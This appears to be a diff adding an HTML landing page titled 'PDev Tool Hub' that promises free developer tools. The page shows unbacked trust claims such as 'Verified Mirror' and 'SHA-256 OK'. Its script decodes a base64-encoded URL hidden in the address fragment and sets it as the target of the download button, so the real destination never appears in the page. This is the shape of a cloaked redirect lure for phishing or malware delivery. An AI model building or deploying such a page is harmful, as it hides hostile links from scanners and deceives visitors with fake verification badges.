@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>PDev Tool Hub</title>
+<style>
+:root{--bg:#090d16;--card:#101623;--border:#1e293b;--text:#f8fafc;--muted:#94a3b8;--blue:#2563eb;--green:#10b981}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg) radial-gradient(circle at 50% 0,rgba(37,99,235,.15),transparent 60%);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem}
+.wrap{max-width:440px;width:100%}
+.pill{display:inline-flex;align-items:center;gap:.4rem;padding:.25rem .7rem;border-radius:999px;background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.25);color:#34d399;font-size:.7rem;font-weight:600;margin-bottom:1.2rem}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green)}
+.card{background:var(--card);border:1px solid var(--border);border-radius:1.25rem;padding:2rem 1.75rem;box-shadow:0 25px 50px -12px rgba(0,0,0,.5);text-align:center}
+.badge{width:50px;height:50px;border-radius:.8rem;background:#1e293b;border:1px solid #334155;display:flex;align-items:center;justify-content:center;margin:0 auto 1.2rem;color:#60a5fa}
+.badge svg{width:24px;height:24px}
+h1{font-size:1.35rem;font-weight:700;margin-bottom:.4rem;color:#fff}
+.desc{font-size:.88rem;color:var(--muted);line-height:1.55;margin-bottom:1.4rem}
+.meta{background:#090d16;border:1px solid #1e293b;border-radius:.75rem;padding:.7rem 1rem;margin-bottom:1.4rem;display:flex;justify-content:space-between;font-size:.75rem}
+.meta-l{color:#64748b;font-size:.65rem;text-transform:uppercase}
+.meta-v{font-family:monospace;font-weight:600;color:#cbd5e1}
+.btn{display:flex;align-items:center;justify-content:center;gap:.5rem;width:100%;padding:.95rem 1.25rem;background:var(--blue);color:#fff;font-size:.95rem;font-weight:600;text-decoration:none;border-radius:.85rem;border:1px solid #3b82f6;cursor:pointer;box-shadow:0 4px 18px rgba(37,99,235,.35);transition:all .2s}
+.btn:hover{background:#1d4ed8;transform:translateY(-2px)}
+.btn svg{width:18px;height:18px}
+.specs{margin-top:1.2rem;display:flex;justify-content:center;gap:1.2rem;font-size:.72rem;color:#64748b}
+.spec{display:flex;align-items:center;gap:.3rem}
+.spec svg{width:12px;height:12px;color:var(--green)}
+.ftr{text-align:center;margin-top:1.5rem;font-size:.72rem;color:#475569}
+</style></head>
+<body><div class="wrap">
+<div style="text-align:center"><div class="pill"><span class="dot"></span>Verified Mirror &bull; Fast CDN</div></div>
+<div class="card">
+<div class="badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg></div>
+<h1>PDev Tool Hub</h1>
+<p class="desc">PDev Tool Hub — Free Developer Utilities & Resources. Click link below to access latest tools & assets.</p>
+<div class="meta">
+<div><div class="meta-l">Protocol</div><div class="meta-v">TLS 1.3 / Direct</div></div>
+<div style="text-align:right"><div class="meta-l">Integrity</div><div class="meta-v">SHA-256 OK</div></div>
+</div>
+<a href="#" id="cta-btn" class="btn" rel="noopener noreferrer">
+<span>Get Free Access Now</span>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+</a>
+<div class="specs">
+<span class="spec"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>Direct Referrer</span>
+<span class="spec"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>Cross-Site Nav</span>
+</div></div>
+<div class="ftr">&copy; 2026 PDev Hub &bull; Precision Developer Network</div>
+</div>
+<script>
+(function(){
+function p(){
+var h=window.location.hash;if(!h||h.length<2)return null;
+try{
+var r=h.charAt(0)==='#'?h.slice(1):h;
+try{r=decodeURIComponent(r)}catch(_){}
+r=r.replace(/-/g,'+').replace(/_/g,'/').trim();
+while(r.length%4!==0){r+='='}
+var b=atob(r),d;
+try{
+var u=new Uint8Array(b.length);
+for(var i=0;i<b.length;i++){u[i]=b.charCodeAt(i)}
+d=new TextDecoder('utf-8').decode(u);
+}catch(_){d=b}
+if(d&&(d.indexOf('http://')===0||d.indexOf('https://')===0)){return d}
+}catch(e){}
+return null;
+}
+function s(){var t=p(),b=document.getElementById("cta-btn");if(t&&b){b.href=t}}
+if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",s)}else{s()}
+window.addEventListener("hashchange",s);
+})();
+</script></body></html>
